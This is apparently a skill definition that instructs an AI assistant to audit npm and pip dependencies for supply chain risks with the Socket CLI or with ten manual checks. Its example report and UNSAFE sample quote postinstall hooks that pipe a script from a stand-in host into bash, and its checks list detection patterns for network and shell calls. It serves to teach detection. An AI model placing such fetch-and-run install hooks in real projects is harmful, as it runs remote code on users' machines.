# Socket SCA

This skill performs software composition analysis (SCA) for npm and pip projects using the Socket.dev `socket` CLI, identifying supply chain risks such as install-script abuse, typosquatting, obfuscated code, protestware, and malicious packages, then mapping findings to CWE and OWASP Top 10:2021 standards. Where the CLI is unavailable, ten structured manual checks provide partial coverage.

## When to Use

- When the user asks to "scan dependencies for supply chain risks" or "run Socket"
- When the user mentions "SCA", "dependency audit", or "supply chain analysis"
- When reviewing `package.json`, `package-lock.json`, `requirements.txt`, or `Pipfile` before deployment
- When a pull request adds or upgrades dependencies and a security check is requested
- When the user asks to detect typosquatting, install scripts, or malicious packages
- When onboarding a third-party library and due diligence is needed
- When investigating a suspected compromised or protestware package

## When NOT to Use

- When the user wants SAST on application source code (use `bandit-sast` or `semgrep`)
- When the user wants runtime or dynamic analysis (use DAST tools like `nuclei`)
- When the user is asking about code style, formatting, or linting
- When the `security-review` skill already covers the request at a general level
- When scanning container images or IaC templates (use `iac-scanner` instead)
- When the target directory contains **no dependency manifests** (package.json, requirements.txt, Pipfile) — you **MUST** decline and recommend `crypto-audit`, `security-review`, or `bandit-sast` as appropriate
- When the user wants to **generate a CI/CD pipeline** — you **MUST** decline and recommend `devsecops-pipeline`

## Prerequisites

### Tool Installed (Preferred)

```bash
# Detection
socket --version

# Installation (if not found)
npm install -g @socketsecurity/cli
```

Minimum version: Socket CLI 0.9+. A free Socket.dev account is recommended for full alert detail; the CLI works without authentication for basic scans.

### Tool Not Installed (Fallback)

> **Note:** This is a limited review. Install `@socketsecurity/cli` for comprehensive supply chain scanning with real-time threat intelligence.

When the Socket CLI is not available, perform these ten manual supply chain checks:

1. **Typosquatting detection** — Compare each package name character-by-character against known popular packages (e.g., `lodahs` vs `lodash`, `reqeusts` vs `requests`). Flag any name within one or two edit-distance of a top-500 npm/PyPI package.
2. **Install script detection** — Open each direct dependency's `package.json` and check for `"preinstall"`, `"install"`, or `"postinstall"` scripts. Any shell commands here execute automatically on `npm install` and warrant manual review.
3. **Known-malicious package check** — Search package names against public malicious package lists (e.g., Snyk Vuln DB, OSV, PyPI advisory database). Flag any name that has appeared in security advisories.
4. **Overly broad permissions** — Inspect dependency source for `require('child_process')`, `require('net')`, `require('fs')`, `os.system()`, or `subprocess` in packages that have no legitimate need for those capabilities.
5. **Protestware indicators** — Grep dependency source for geopolitical conditionals (`if (country === ...)`, locale checks), calls to `os.exit()`, or destructive file operations (`fs.rmSync`, `shutil.rmtree`) in non-test code.
6. **Dependency age and popularity** — Check npm/PyPI metadata for packages published fewer than 30 days ago with under 500 weekly downloads. New, obscure packages carry elevated supply chain risk.
7. **Pinning gaps** — Scan `package.json` for versions using `^`, `~`, `*`, or no pin at all. Unpinned ranges allow silent malicious upgrades. `requirements.txt` entries without `==` are similarly unsafe.
8. **Excessive transitive dependencies** — Run `npm ls --depth=10` or `pipdeptree` mentally and flag dependency trees deeper than 8 levels or with more than 200 transitive packages, as attack surface grows with tree size.
9. **Obfuscated code patterns** — Search dependency source for `eval(`, `Function(`, `Buffer.from(..., 'base64')`, `__import__('base64')`, or long single-line strings (>500 chars). These are indicators of payload hiding.
10. **Network calls in install hooks** — Check `preinstall`/`postinstall` scripts and `setup.py` for `curl`, `wget`, `fetch(`, `http.get(`, or `urllib` calls. Install-time network access is a common exfiltration and staging vector.

## Workflow

> **MANDATORY FIRST ACTION:** You **MUST** run `socket --version` to check if the Socket CLI is installed. If not found, offer to install via `npm install -g @socketsecurity/cli` before falling back to manual checks. Do NOT skip this step.

> You **MUST** analyze ALL manifest files detected in this step — do not analyze only one ecosystem when multiple are present.

1. **Detect manifest** — Check for `package.json`, `package-lock.json`, `yarn.lock`, `requirements.txt`, `Pipfile`, or `pyproject.toml` to confirm this is an npm or Python project.
2. **Check for Socket CLI** — Run `socket --version` to determine if the CLI is installed.
3. **If Socket CLI is installed:**
   a. For npm projects, run `socket scan create --json .` from the project root to submit the manifest and receive findings.
   b. For Python projects, run `socket scan create --json --python .` or point Socket at the `requirements.txt` file.
   c. Parse the JSON output — each alert contains `type`, `severity`, `packageName`, `packageVersion`, and `description`.
   d. Map each alert `type` to its CWE using the Reference Tables below.
   e. Map each CWE to its OWASP Top 10:2021 category.
4. **If Socket CLI is NOT installed:**
   a. Offer to install via `npm install -g @socketsecurity/cli`.
   b. If the user declines, run the ten manual fallback checks listed in Prerequisites.
   c. Include the disclaimer: "This is a limited review. Install `@socketsecurity/cli` for comprehensive scanning."
5. **Compile findings** — Deduplicate results (same package + alert type counts once) and sort by severity: Critical > High > Medium > Low.
6. **Generate report** — Present findings using the Findings Format below, grouping by affected package where helpful.
7. **Summarize** — State total findings, breakdown by severity, total affected packages, and top 3 remediation priorities.

**User prompt:**
> "Check these dependencies for supply chain issues"

**Expected output (abbreviated):**

```text
## Supply Chain Review (Manual Fallback)

> Note: This is a limited review. Install @socketsecurity/cli for comprehensive scanning.

Reviewed package.json (12 direct dependencies)

### Findings (3 total: 1 Critical, 1 High, 1 Medium)

| # | Severity | CWE      | OWASP | Package @ Version  | Issue                                                             |
|---|----------|----------|-------|--------------------|-------------------------------------------------------------------|
| 1 | Critical | CWE-1357 | A06   | lodahs@*           | Typosquatting: "lodahs" is likely a typosquat of "lodash"         |
| 2 | High     | CWE-506  | A08   | setup-env@1.2.0    | postinstall script runs: curl https://evil.example.com | bash     |
| 3 | Medium   | CWE-1104 | A06   | request@2.88.2     | Deprecated: maintainer archived this package in 2020              |

### Recommendations
1. Replace lodahs with lodash (official package) (Finding #1)
2. Remove setup-env and investigate when and why it was added (Finding #2)
3. Replace request with node-fetch, got, or axios (Finding #3)
```

### UNSAFE vs SAFE: Key Supply Chain Patterns

**UNSAFE — Unpinned versions (allows silent malicious upgrades):**

```json
{
  "dependencies": {
    "lodash": "*",
    "express": "^4.0.0",
    "axios": "~1.0.0"
  }
}
```

**SAFE — Exact pinned versions:**

```json
{
  "dependencies": {
    "lodash": "4.17.21",
    "express": "4.18.2",
    "axios": "1.6.7"
  }
}
```

**UNSAFE — Install hook with remote execution:**

```json
{
  "scripts": {
    "postinstall": "curl -s https://example.com/setup.sh | bash"
  }
}
```

**SAFE — No install hooks, or hooks limited to local build steps only:**

```json
{
  "scripts": {
    "postinstall": "node scripts/generate-types.js"
  }
}
```
